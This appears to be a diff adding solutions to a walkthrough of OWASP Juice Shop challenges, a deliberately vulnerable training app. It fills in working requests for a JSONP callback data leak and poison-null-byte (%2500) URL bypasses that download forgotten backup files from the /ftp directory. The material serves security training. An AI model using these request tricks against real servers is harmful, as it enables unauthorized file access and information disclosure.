@@ -49,10 +49,17 @@ curl -O http://juiceshop:3000/ftp/acquisitions.md
 
 ## Email Leak
 
+* [Wikipedia JSONP](https://en.wikipedia.org/wiki/JSONP)
+
 Perform an unwanted information disclosure by accessing data cross-domain
 
 ```bash
-TODO
+http http://juiceshop:3000/rest/user/whoami
+# {"user":{}}
+
+# auth is ignored
+http http://juiceshop:3000/rest/user/whoami?callback=foo
+# /**/ typeof foo === 'function' && foo({"user":{}});
 ```
 
 ## Exposed Metrics
@@ -67,10 +74,14 @@ http http://juiceshop:3000/metrics
 
 ## Forgotten Developer Backup
 
+* [Null byte attacks are alive and well](https://portswigger.net/blog/null-byte-attacks-are-alive-and-well)
+* [Common PHP attacks: Poison Null Byte](https://defendtheweb.net/article/common-php-attacks-poison-null-byte)
+
 Access a developer's forgotten backup file
 
 ```bash
-TODO
+# %00 -> url encoded %2500
+curl http://juiceshop:3000/ftp/package.json.bak%2500.md
 ```
 
 ## Forgotten Sales Backup
@@ -78,7 +89,7 @@ TODO
 Access a salesman's forgotten backup file
 
 ```bash
-TODO
+curl http://juiceshop:3000/ftp/coupons_2013.md.bak%2500.pdf
 ```
 
 ## GDPR Data Theft
